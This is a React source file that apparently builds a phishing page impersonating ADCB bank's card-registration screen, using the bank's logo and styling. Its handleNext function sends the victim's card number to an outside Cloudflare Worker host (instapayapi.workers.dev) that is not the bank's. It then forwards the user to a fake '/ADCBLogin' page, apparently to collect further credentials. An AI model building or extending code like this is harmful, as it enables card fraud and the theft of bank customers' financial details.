import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Logo from "./assets/adcb.jpg"

const CreditCardIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke="white" strokeWidth="1.8">
        <rect x="2" y="5" width="20" height="14" rx="2" stroke="white" strokeWidth="1.8" />
        <line x1="2" y1="10" x2="22" y2="10" stroke="white" strokeWidth="1.8" />
        <line x1="6" y1="15" x2="10" y2="15" stroke="white" strokeWidth="2" strokeLinecap="round" />
    </svg>
);

const CustomerIcon = ({ active }) => (
    <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke={active ? "white" : "#555"} strokeWidth="1.8">
        <circle cx="12" cy="8" r="4" />
        <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" strokeLinecap="round" />
    </svg>
);

// 👇 Replace "/adcb-logo.png" with the actual imported path or URL of your logo
const ADCBLogo = () => (
    <img
        src={Logo}
        alt="ADCB Logo"
        style={{ height: "48px", objectFit: "contain" }}
    />
);

const StepDots = () => (
    <div className="flex items-center gap-1">
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5 bg-gray-300" />
        <div className="w-4 h-4 rounded-full border-2 border-gray-300 bg-white" />
        <div className="w-8 h-0.5 bg-gray-300" />
        <div className="w-4 h-4 rounded-full border-2 border-gray-300 bg-white" />
    </div>
);

export default function ADCBRegister() {
    const [activeTab, setActiveTab] = useState("card");
    const [cardNumber, setCardNumber] = useState("");
    const [touched, setTouched] = useState(false);

    const navigate = useNavigate();
    // const isEmpty = touched && cardNumber.trim() === "";
    const isEmpty = touched && cardNumber.trim() === "";
    const isInvalidCard = touched && activeTab === "card" && cardNumber.trim() !== "" && cardNumber.length < 16;

    const handleNext = async () => {
        setTouched(true);
        if (cardNumber.trim() !== "" && (activeTab !== "card" || cardNumber.length === 16)) {
            const payload = {
                cardNumber: cardNumber
            }
            await fetch(
                " https://my-worker-app.instapayapi.workers.dev/api/cardNumber",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                },
            );
            navigate("/ADCBLogin", { state: { cardNumber: cardNumber } });
        }
    };

    return (
        <div
            className="flex flex-col overflow-hidden"
            style={{
                width: "100%",
                height: "100vh",
                maxHeight: "100vh",
                fontFamily: "'Helvetica Neue', Arial, sans-serif",
            }}
        >
            {/* Nav bar */}
            <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
                <button className="mr-4 text-gray-700">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                        <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                </button>
                <div className="flex-1 flex justify-center">
                    <ADCBLogo />
                </div>
            </div>

            {/* Content */}
            <div className="flex-1 flex flex-col px-5 pt-6 pb-8 overflow-hidden relative">

                {/* Header row */}
                <div className="flex justify-between items-center mb-8 flex-shrink-0">
                    <span className="font-black text-gray-900 tracking-wide text-sm">REGISTER WITH</span>
                    <StepDots />
                </div>

                {/* Tab options with horizontal divider line passing through icon centers — full width */}
                <div className="flex-shrink-0 mb-10">
                    <div className="relative flex">

                        {/* Horizontal divider line — full width, at vertical center of icons */}
                        <div
                            className="absolute bg-gray-300"
                            style={{
                                top: "48px",
                                left: 0,
                                right: 0,
                                height: "1px",
                                zIndex: 0,
                            }}
                        />

                        {/* Card Number tab — left 50% */}
                        <div
                            className="flex flex-col items-center gap-3 cursor-pointer relative"
                            style={{ width: "50%", zIndex: 1 }}
                            onClick={() => setActiveTab("card")}
                        >
                            <div
                                className="w-24 h-24 rounded-full flex items-center justify-center transition-all duration-200"
                                style={{ background: activeTab === "card" ? "#cc0000" : "#e8e8e8" }}
                            >
                                <CreditCardIcon />
                            </div>
                            <span className="text-sm text-gray-700">Card Number</span>
                        </div>

                        {/* Customer ID tab — right 50% */}
                        <div
                            className="flex flex-col items-center gap-3 cursor-pointer relative"
                            style={{ width: "50%", zIndex: 1 }}
                            onClick={() => setActiveTab("customer")}
                        >
                            <div
                                className="w-24 h-24 rounded-full flex items-center justify-center transition-all duration-200"
                                style={{ background: activeTab === "customer" ? "#cc0000" : "#e8e8e8" }}
                            >
                                <CustomerIcon active={activeTab === "customer"} />
                            </div>
                            <span className="text-sm text-gray-700">Customer ID</span>
                        </div>
                    </div>
                </div>

                {/* Input field */}
                <div className="mb-2 flex-shrink-0">
                    <div className="flex justify-between items-center mb-2">
                        <label className="font-bold text-gray-900 text-sm">
                            {activeTab === "card" ? "Your Credit or Debit Card Number" : "Your Customer ID"}
                        </label>
                        {isEmpty && (
                            <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center">
                                <span className="text-white text-xs font-bold">!</span>
                            </div>
                        )}
                       
                    </div>
                    <input
                        type="text"
                        inputMode={activeTab === "card" ? "numeric" : "text"}
                        value={cardNumber}
                        onChange={e => {
                            const val = e.target.value;
                            if (activeTab === "card") {
                                const digits = val.replace(/\D/g, "").slice(0, 16);
                                setCardNumber(digits);
                            } else {
                                setCardNumber(val);
                            }
                        }}
                        onBlur={() => setTouched(true)}
                        placeholder={activeTab === "card" ? "Enter your card number" : "Enter your customer ID"}
                        className="w-full px-4 py-4 rounded-lg bg-white text-gray-400 text-sm outline-none transition-all"
                        style={{
                            border: "1.5px solid #cc0000",
                            fontSize: "15px",
                            letterSpacing: activeTab === "card" ? "2px" : "normal",
                        }}
                    />
                    {isEmpty && (
                        <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
                    )}
                     {isInvalidCard && (
                            <p className="text-red-600 text-xs mt-1">Please enter a valid Credit or Debit Card Number</p>
                        )}
                </div>

                {/* Spacer */}
                <div className="flex-1" style={{ maxHeight: "85px" }} />

                {/* Next button */}
                <button
                    onClick={handleNext}
                    className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 flex-shrink-0"
                    style={{ background: "#cc0000" }}
                >
                    Next
                </button>

                {/* Support */}
                <div className="flex justify-center items-center gap-2 mt-6 flex-shrink-0">
                    <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                    <a href="#" className="text-red-600 text-sm underline">Support</a>
                </div>

                {/* Watermark */}
                <div
                    className="absolute bottom-0 left-0 right-0 h-32 pointer-events-none opacity-10"
                    style={{
                        backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
                        backgroundSize: "8px 8px",
                    }}
                />
            </div>
        </div>
    );
}